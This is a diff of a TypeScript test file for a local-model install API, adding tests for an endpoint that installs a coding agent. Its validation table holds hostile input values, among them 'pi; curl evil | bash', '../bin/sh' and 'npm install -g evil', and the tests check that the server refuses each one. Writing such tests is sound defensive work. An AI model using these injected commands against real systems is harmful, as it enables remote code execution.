@@ -156,6 +156,7 @@ const IDLE_VIEW: LocalModelInstallView = {
   runtime: { version: '0.40.15', installed: false, downloadBytes: 185971671, downloadGb: '0.2', unpackedGb: '0.6' },
   folder: '/Users/me/.codeman/local-model',
   library: [],
+  harnesses: [],
   actions: ['install'],
 };
 
@@ -185,6 +186,7 @@ function fakeService(): ServiceMock {
     install: vi.fn(async () => OK_RESULT),
     use: vi.fn(async () => OK_RESULT),
     deleteLibraryModel: vi.fn(async () => OK_RESULT),
+    installAgent: vi.fn(async () => OK_RESULT),
     cancel: vi.fn(async () => OK_RESULT),
     resume: vi.fn(async () => OK_RESULT),
     runtime: vi.fn(async () => OK_RESULT),
@@ -284,8 +286,21 @@ describe('GET /api/local-model', () => {
     const res = await get(f.deps);
     expect(res.json().data.install).toEqual(INSTALLING_VIEW);
     expect(f.service.view).toHaveBeenCalledTimes(1);
+    // The facts built for the recommendation are the ones the view lists its coding agents
+    // from: the availability probe is asked once per answer, not twice.
+    expect(f.service.view).toHaveBeenCalledWith({ harnessFacts: FACTS });
+    expect(f.buildHarnessFacts).toHaveBeenCalledTimes(1);
     // Looking is not doing: no verb of the service was called.
-    for (const verb of ['install', 'cancel', 'resume', 'runtime', 'remove', 'boot', 'shutdown'] as const) {
+    for (const verb of [
+      'install',
+      'installAgent',
+      'cancel',
+      'resume',
+      'runtime',
+      'remove',
+      'boot',
+      'shutdown',
+    ] as const) {
       expect(f.service[verb]).not.toHaveBeenCalled();
     }
   });
@@ -565,6 +580,7 @@ describe('the install verbs', () => {
       url: '/api/local-model/models',
       payload: { modelId: 'qwen3.8:27b' },
     },
+    { name: 'installAgent', method: 'POST', url: '/api/local-model/agent', payload: { cli: 'pi' } },
     { name: 'cancel', method: 'POST', url: '/api/local-model/cancel', payload: undefined },
     { name: 'resume', method: 'POST', url: '/api/local-model/resume', payload: {} },
     { name: 'runtime', method: 'POST', url: '/api/local-model/runtime', payload: { action: 'stop' } },
@@ -993,6 +1009,67 @@ describe('the library verbs', () => {
       const res = await app.inject({ method: 'POST', url: '/api/local-model/use', ...(payload ? { payload } : {}) });
       expect(res.statusCode).toBe(400);
       expect(f.service.use).not.toHaveBeenCalled();
+    });
+  });
+
+  describe('POST /api/local-model/agent', () => {
+    it('hands the service the coding agent and who asked, and looks at no session', async () => {
+      const f = fakes();
+      const { app } = await harness(f.deps, { username: 'alice', role: 'admin' }, SESSIONS);
+      await app.inject({ method: 'POST', url: '/api/local-model/agent', payload: { cli: 'pi' } });
+      // Nothing about the model in use changes, so live sessions on it do not matter.
+      expect(f.service.installAgent).toHaveBeenCalledWith({ cli: 'pi' }, { username: 'alice', ip: '127.0.0.1' });
+    });
+
+    it('an agent the server does not offer is a 400 with the sentence, as text and as data', async () => {
+      const f = fakes();
+      f.service.installAgent.mockResolvedValue({
+        ok: false,
+        status: 400,
+        message: { text: LOCAL_MODEL_INSTALL_LABELS.refusedAgentNotInstallable, vars: { cli: 'DeepSeek' } },
+      });
+      const { app } = await harness(f.deps);
+      const res = await app.inject({ method: 'POST', url: '/api/local-model/agent', payload: { cli: 'deepseek' } });
+      expect(res.statusCode).toBe(400);
+      expect(res.json()).toEqual({
+        success: false,
+        error: 'DeepSeek is not installed and cannot be installed from here.',
+        errorCode: 'INVALID_INPUT',
+        data: {
+          message: {
+            text: '{cli} is not installed and cannot be installed from here.',
+            vars: { cli: 'DeepSeek' },
+          },
+        },
+      });
+    });
+
+    it('an installer that already runs is a 409 with the reason', async () => {
+      const f = fakes();
+      f.service.installAgent.mockResolvedValue({
+        ok: false,
+        status: 409,
+        conflict: { reason: 'job-running', message: { text: LOCAL_MODEL_INSTALL_LABELS.conflictJobRunning } },
+      });
+      const { app } = await harness(f.deps);
+      const res = await app.inject({ method: 'POST', url: '/api/local-model/agent', payload: { cli: 'pi' } });
+      expect(res.statusCode).toBe(409);
+      expect(res.json()).toMatchObject({ success: false, errorCode: 'CONFLICT', data: { reason: 'job-running' } });
+    });
+
+    it.each([
+      ['no body', undefined],
+      ['no agent', {}],
+      ['a command', { cli: 'pi; curl evil | bash' }],
+      ['a path', { cli: '../bin/sh' }],
+      ['an upper-case id', { cli: 'Pi' }],
+      ['a command of its own', { cli: 'pi', command: 'npm install -g evil' }],
+    ])('refuses %s before the service is asked', async (_name, payload) => {
+      const f = fakes();
+      const { app } = await harness(f.deps);
+      const res = await app.inject({ method: 'POST', url: '/api/local-model/agent', ...(payload ? { payload } : {}) });
+      expect(res.statusCode).toBe(400);
+      expect(f.service.installAgent).not.toHaveBeenCalled();
     });
   });
 
